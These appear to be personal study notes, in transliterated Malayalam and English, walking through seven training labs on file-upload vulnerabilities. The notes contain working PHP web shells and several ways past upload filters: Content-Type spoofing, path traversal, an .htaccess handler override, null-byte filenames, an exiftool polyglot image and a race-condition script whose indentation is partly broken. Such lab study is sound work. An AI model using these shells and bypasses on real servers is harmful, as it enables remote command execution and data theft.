-->A `web shell` is a malicious script that enables an attacker to execute arbitrary commands on a remote web server simply by sending HTTP requests to the right endpoint. 
-->If you're able to successfully upload a web shell, you effectively have full control over the server. This means you can read and write arbitrary files, exfiltrate sensitive data, even use the server to pivot attacks against both internal infrastructure and other servers outside the network

     Lab-1(Remote code execution via web shell upload)
-->ivide namal aadyam wiener:peter aayi keranam
-->enit namude account il puthiya avatar add chyan ulla option undakum
-->so upload option upayogich puthiya image upload chyuka
-->ini thirich my account il poi nokiyal kanam namude avatar avide kanikum
-->ini burp history il pokuka.avide /POST avatar, athupole GET avatar um kanam
-->athayath namal upload chythathum pine upload chythathin shesham aa image namude retireve chyth tharunathum(ee GET req kitan burp il image req tick idanam)
-->ini enth chyanamenal ee rand request repeater il iduka
-->enit /POST avater request il nokiyal kanam ee kodukuka image oru form roopathil aan pokunath.so athil filename=cat.jpg ennayirikum undavuka.so ath mati filename=exploit.php enn kodukuka enit aa image inte valiya oru formatum undakum.ath clear chyuka enit avide - 
           <?php echo file_get_contents('/home/carlos/secret'); ?>
	enna content kodukuka
-->ini namude mate /GET request il poi - GET /files/avatars/expoloit.php HTTP/1.1 enn kodukuka apol namude aa php code il enthano koduthath ath execute aayikolum
-->NOTE: ivide php file execute chyunond aan ee rethiyil exploit chyan kazhinjath
-->nerthe php code aakunilegi ith try chyth noku:
                       <?php echo system($_GET['command']); ?>
                       <?php echo system($_GET['ls']); ?>
-->ee paripadine fileupload vulnerability enn mathramalla ithine main aayi webshell ennan parayuka ok

       Lab-2( Web shell upload via Content-Type restriction bypass)
-->ivide engane aan chyunathenal content-type: header exploit chythitan
-->chela samayangalil server content-type: enna header nokiyan validate chyuka.so ivide namal .php file idunu apol automatic aayi application/php enn content-type kanikum.apol ath namal image/jpeg enn aki koduth send chythal mathi
-->so nerthe pole oru php file undakuka enit athil -            <?php echo file_get_contents('/home/carlos/secret'); ?> .enn kodukuka 
-->file upload chyuka apol error kanikum.image/jpeg type mathrame aaku enn kanikum
-->so nammal onukoodi upload chyuka.ipol intercept chyuka.enit athil content-type:application/php ennath image/jpeg enn akuka enit send adikumbil response kanam upload aayi en
-->ini thirich aa image il poit inspect element adikuka apol athinte sourse src= file kanikum.so aa file il poi nokiyal kanam aa php code inte result so aayi

      Lab-3( Web shell upload via path traversal)
-->ivide nerthe pole alla.nerthe rand lab ilum namal upload chyuna php file server execute chyth tharunund.ivide angane chyunila pakaranam athile content athpole display chyth tharunu enn mathram
-->so namal exploit.php enna file upload chyumbol polum server oru error um tharunila
-->enit aa pathilek poyal aa php code angane thane display chyth tharum
-->so ee avatar upload chyuna /POST request edukuka enit athil - Content-Disposition: form-data; name="avatar"; filename="exploit.php"  enn kanum
-->so ivide filename="../exploit.php" enn koduth ee file parent directory il idan patumon nokuka.apol response 200 ok enn kanikumengilum ../ enn kanikila so athinartham ath path traversal aayi upload nadanitila ennan
-->so ini enth venamenal ../ ennath url encode chyth ..%2f ennakuka.ini send adikumbol response il 200 ok ..%2fexploit.php enn kanikum.
-->==nammal ingane parent directory il idunath enthinanenal current directroyil file execute chyunila.pakarnam parent directory il file idumbol server aa file execute chyan sadhyatha und==
-->so ini namal aa upload chytha image site il ninum nokuka.inspect element adich src=" /files/avatars/..%2fexploit.php" edukuka.enit aa path ilek poyal aa file execute cyunathayi kanam.so aayi

     Lab-4(Web shell upload via extension blacklist bypass)
-->==The .htaccess (Hypertext Access) file is an Apache distributed server configuration file. You can use the .htaccess file to set server configurations for a specific directory.You can use the .htaccess file to modify various configurations and thus make changes to your website. These changes include authorization, error handling, redirects for specific URLs, user permissions, etc==
-->ivide namuk php file upload chyan patila.error varuna response il nokumbol kanam-Server: Apache/2.4.41 (Ubuntu) enn.so apache aan server enn namal manasilaki.ini namal mumbathe point il kandu .htaccess file oru directory il aaki server configuration chyan patumenath.so namal enth chyanamenal `.shell` enna extension varuna files oke php execute chyunathpole execute chyanam enna oru configuration ee .htaccess file il undakunu.apol pine namuk exploit.php enn itt upload chyunathin pakaram exploit.shell enn ittal mathi php execution thane nadanolum
-->so aadyam oru normal image upload chyuka
-->ini exploit.php enna file upload chyuka apol error varum athupole server ine patti disclose chythathum kanum
-->ini filename="exploit.php" ullath mati filename=".htaccess" ennakuka.athinte thazhe -  <?php echo file_get_contents('/home/carlos/secret'); ?> enna exploit.php file inte content maati ->AddType application/x-httpd-php .shell (.josu,.shajan enthum kodukam).ennu kodukuka.ith namal .htaccess file il kodukuna configuration aan.apol enth sambavikumenal ini .shell enna extension varuna files upload aakumbol automatic aayi ith php execution aayitan bhaviyil execute chyapeduka
-->ini ith send chyuka.apol 200 OK kanam.athinartham aa directoryil ee .htaccess file upload aayitund
-->ini namal undo adich nerthe exploit.php upload request il thane thirich varuka.enit filename="exploit.shell" enn kodukuka.content -><?php echo file_get_contents('/home/carlos/secret'); ?> thane aano en urap varuthuka.eni send adichal aa file upload aakum. ini namal files/avatar/exploit.shell pathilek poyal aa php code run aakum angane carlos inte secret kanan patum.aayi

    Lab-5(Web shell upload via obfuscated file extension)
-->ivide namal aadyam oru normal image upload chyuka.enit athile /POST and /GET request edukuka.athayath upload chyuna image inte request um athinu shesham aa same image namuk retireve chyunathum.ella lab ilum ingane thane aan chyunath
-->ini upload chyumbol namuk kanam error varunath
-->so filename="exploit.php" ennath namal "exploit.php%00.jpg" ennakunu.null byte injection aan chythath
-->ipol response il kanam `The file avatars/exploit.php has been uploaded` enn. null byte aayathkond baaki automatic aayi remove aayi
-->ini namal files/avatar/exploit.php il poyal carlos inte secret kitum.aayi

    Lab-6(Remote code execution via polyglot web shell upload)
-->chela samayangalil server oru file ile content thane analyze chyum genuine aano enariyan.ie image file il dimensions undakum apol dimensions ilatha file aannengil reject chyum
-->so ivide namal exiftool enna tool use chyth venduna image file ile meta datas modify chyunu
-->so ->exiftool bg.jpg ennadikumbol aa image file ile meta data kanikum
-->ini ->exiftool -commen="hello" bg.jpg ennadichit pinem ->exiftool bg.jpg adichu nokiyal puthiya oru comment kanan patum
-->so namal enth chyunu enal ee commentile hello value in pakaram oru php code athil kodukunu angane namuk carlos inte secret code kandupidikam
-->exiftool -Comment="<?php echo '################# ' . file_get_contents('/home/carlos/secret') . ' #########################'; ?>" bg.jpg -0 webshell.php
-->ivide #### ennu itathu enthinanenal peten manasilakan aanu evide aan secret code vanathen ariyan
-->ingane php code koduthathin shesham ath mattoru file il akuka(ie webshell.php). ingane chyumbol ath oru polyglot file aayi mari ie .php extension und but ullil athoru jpg file aan.so server in oru samshayavum undakila.ini ee webshell.php file upload chyuka enit /files/avatar/webshell.php enn path il repeateril poi nokiyal kanam responsil ###########   secretcode  #########   .aayi

     Lab-7(Web shell upload via race condition)
-->ivide namal upload chyuna files server avarude thane reethiyil validate chyunu.enit validation pass chyunilengi ath remove chyunu.chelapo server oru prathyeka sandbox il file kondupoi idum enit avide vech analuse chythite accept chyy
-->ingane analyse chyuna aa samayam kond namuk exploitation nadathanam.ie race aayi file kore upload chyanam apol server in ellam validate chyan patanamenila
-->ivide namal aadyam satharana pole oru normal file upload chyunu
-->ini turbo intruder extension install chyanam
-->ini expoit.php enna file upload chyanam apol error varum but kozhapamila.namuk enthayalum ee request vendathan
-->ini /GET /files/avatars/exploit.php enna request edukuka.right click chyth turbo intruder ilek send chyuka
-->enit enth venamenal oru python code und ath add kodukanam.enit aadyam /POST filename="exploit.php" enna reqeust kodukanam.pine athin shehsam thazhe aayi /GET /files/avatar/exploit.php enna request um koduth script add chyanam.enit start attack kodukumbol kanam ee same exploit.php enna file upload chyunath chara para aayi send aakunath apol server in elam validate chyan patila angane ee file execute aakunu server il angane namuk carlos inte secret code kitunu

==============================================================
turbo intruder python code:

      def queueRequests(target, wordlists):
      engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''<YOUR-POST-REQUEST>'''

    request2 = '''<YOUR-GET-REQUEST>'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


    def handleResponse(req, interesting):
    table.add(req)
	
==========================================================